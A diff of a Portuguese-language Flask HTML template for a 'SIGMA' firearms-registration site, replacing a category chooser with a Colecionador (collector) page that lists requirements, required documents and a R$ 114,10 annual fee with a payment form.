@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SIGMA - Escolha sua Categoria</title>
+    <title>SIGMA - Categoria Colecionador</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -58,24 +58,18 @@
     <!-- Blue bar -->
     <div class="bg-custom-blue py-3 shadow-md">
         <div class="container mx-auto px-4 flex items-center">
-            <button class="text-white text-2xl mr-4">
-                <div class="grid grid-cols-2 gap-0.5 drop-shadow-sm">
-                    <div class="w-2 h-2 bg-white"></div>
-                    <div class="w-2 h-2 bg-white"></div>
-                    <div class="w-2 h-2 bg-white"></div>
-                    <div class="w-1.5 h-1.5 bg-white"></div>
-                </div>
-            </button>
-            <span class="text-white text-xl drop-shadow-sm">ESCOLHA SUA CATEGORIA</span>
+            <a href="{{ url_for('obrigado') }}" class="text-white hover:text-gray-200 mr-4">
+                <i class="fas fa-arrow-left"></i>
+            </a>
+            <span class="text-white text-xl drop-shadow-sm">CATEGORIA COLECIONADOR</span>
         </div>
     </div>
 
     <!-- Main Content -->
     <div class="container mx-auto px-4 py-8 flex-grow">
         <div class="max-w-4xl mx-auto">
-            <!-- User Info Box -->
+            <!-- User Info -->
             <div class="bg-white rounded-lg shadow-md p-6 mb-8">
-                <h2 class="text-2xl font-bold text-gray-800 mb-4">Bem-vindo ao Sistema CAC</h2>
                 <div class="grid grid-cols-2 gap-4">
                     <div class="border rounded-lg p-3">
                         <label class="block text-sm font-medium text-gray-600">Nome Completo</label>
@@ -88,43 +82,59 @@
                 </div>
             </div>
 
-            <!-- Category Selection -->
-            <h3 class="text-xl font-bold text-gray-800 mb-6">Selecione sua categoria:</h3>
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-                <!-- Caçador -->
-                <div class="bg-gray-100 rounded-lg p-6 hover:shadow-lg transition-shadow">
-                    <div class="text-center mb-4">
-                        <i class="fas fa-bullseye text-4xl text-custom-blue"></i>
+            <!-- Category Details -->
+            <div class="bg-white rounded-lg shadow-md p-6 mb-8">
+                <div class="flex items-center mb-6">
+                    <i class="fas fa-archive text-4xl text-custom-blue mr-4"></i>
+                    <div>
+                        <h2 class="text-2xl font-bold text-gray-800">Categoria Colecionador</h2>
+                        <p class="text-gray-600">Preservação do patrimônio histórico através de coleções</p>
                     </div>
-                    <h4 class="text-lg font-bold text-gray-800 mb-2">Caçador</h4>
-                    <p class="text-sm text-gray-600 mb-4">Autorização para caça de subsistência em áreas permitidas, com respeito às normas ambientais.</p>
-                    <a href="{{ url_for('categoria', tipo='cacador') }}" class="block w-full bg-custom-blue hover:bg-opacity-90 text-white text-center font-bold py-2 px-4 rounded transition-colors">
-                        Selecionar
-                    </a>
                 </div>
 
-                <!-- Atirador -->
-                <div class="bg-gray-100 rounded-lg p-6 hover:shadow-lg transition-shadow">
-                    <div class="text-center mb-4">
-                        <i class="fas fa-crosshairs text-4xl text-custom-blue"></i>
+                <div class="space-y-6">
+                    <div class="border-l-4 border-custom-blue pl-4">
+                        <h3 class="font-bold text-lg mb-2">Requisitos Específicos:</h3>
+                        <ul class="list-disc list-inside space-y-2 text-gray-700">
+                            <li>Idade mínima de 25 anos</li>
+                            <li>Certidão de antecedentes criminais</li>
+                            <li>Comprovante de residência</li>
+                            <li>Avaliação psicológica</li>
+                            <li>Declaração de acervo</li>
+                            <li>Local adequado para guarda do acervo</li>
+                        </ul>
                     </div>
-                    <h4 class="text-lg font-bold text-gray-800 mb-2">Atirador</h4>
-                    <p class="text-sm text-gray-600 mb-4">Prática esportiva em clubes de tiro, participação em competições e treinamentos.</p>
-                    <a href="{{ url_for('categoria', tipo='atirador') }}" class="block w-full bg-custom-blue hover:bg-opacity-90 text-white text-center font-bold py-2 px-4 rounded transition-colors">
-                        Selecionar
-                    </a>
-                </div>
 
-                <!-- Colecionador -->
-                <div class="bg-gray-100 rounded-lg p-6 hover:shadow-lg transition-shadow">
-                    <div class="text-center mb-4">
-                        <i class="fas fa-archive text-4xl text-custom-blue"></i>
+                    <div class="border-l-4 border-custom-yellow pl-4">
+                        <h3 class="font-bold text-lg mb-2">Documentação Específica:</h3>
+                        <ul class="list-disc list-inside space-y-2 text-gray-700">
+                            <li>Projeto de acervo</li>
+                            <li>Plano de segurança</li>
+                            <li>Inventário detalhado</li>
+                            <li>Certificado de capacidade técnica</li>
+                        </ul>
                     </div>
-                    <h4 class="text-lg font-bold text-gray-800 mb-2">Colecionador</h4>
-                    <p class="text-sm text-gray-600 mb-4">Preservação e estudo do patrimônio histórico através da coleção de armas e munições.</p>
-                    <a href="{{ url_for('categoria', tipo='colecionador') }}" class="block w-full bg-custom-blue hover:bg-opacity-90 text-white text-center font-bold py-2 px-4 rounded transition-colors">
-                        Selecionar
-                    </a>
+
+                    <!-- Taxa Box -->
+                    <div class="bg-gray-100 rounded-lg p-6 mt-6">
+                        <h3 class="font-bold text-lg mb-4">Taxa Obrigatória:</h3>
+                        <div class="space-y-4">
+                            <div class="flex justify-between items-center">
+                                <div>
+                                    <p class="font-medium">Registro de Acervo de Colecionador</p>
+                                    <p class="text-sm text-gray-600">Válida por 1 ano</p>
+                                </div>
+                                <p class="font-bold text-lg">R$ 114,10</p>
+                            </div>
+                            <form action="{{ url_for('pagamento') }}" method="POST" class="mt-4">
+                                <input type="hidden" name="categoria" value="colecionador">
+                                <button type="submit" class="w-full bg-custom-blue hover:bg-opacity-90 text-white font-bold py-3 px-4 rounded transition-colors flex items-center justify-center">
+                                    <i class="fas fa-lock mr-2"></i>
+                                    <span>Pagar Taxa</span>
+                                </button>
+                            </form>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
